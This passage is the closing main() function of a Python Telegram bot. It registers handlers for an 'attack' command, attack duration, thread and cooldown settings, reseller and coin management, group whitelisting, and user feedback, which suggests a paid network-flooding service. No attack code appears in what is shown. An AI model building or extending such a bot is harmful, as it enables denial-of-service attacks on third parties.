        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start)],
        states={
            GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_coin_handler = ConversationHandler(
        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.Text("Add Coin"), add_coin_start)],
        states={
            GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
            GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_group_handler = ConversationHandler(
        entry_points=[CommandHandler("addgroup", add_group_start), MessageHandler(filters.Text("Add Group"), add_group_start)],
        states={
            GET_ADD_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_group_handler = ConversationHandler(
        entry_points=[CommandHandler("removegroup", remove_group_start), MessageHandler(filters.Text("Remove Group"), remove_group_start)],
        states={
            GET_REMOVE_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_group_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add all handlers
    application.add_handler(attack_handler)
    application.add_handler(set_duration_handler)
    application.add_handler(set_threads_handler)
    application.add_handler(set_cooldown_handler)
    application.add_handler(add_reseller_handler)
    application.add_handler(remove_reseller_handler)
    application.add_handler(add_coin_handler)
    application.add_handler(add_group_handler)
    application.add_handler(remove_group_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("listgroups", list_groups))
    
    # Photo feedback handler
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    # Feedback button handler
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.Regex(r'^Feedback$'), 
        feedback
    ))
    
    # Text feedback handler (only when user is waiting for feedback)
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.User(user_id=feedback_waiting.keys()),
        handle_text_feedback
    ))
    
    # Button click handler (should come last)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))

    application.run_polling()

if __name__ == '__main__':
    main()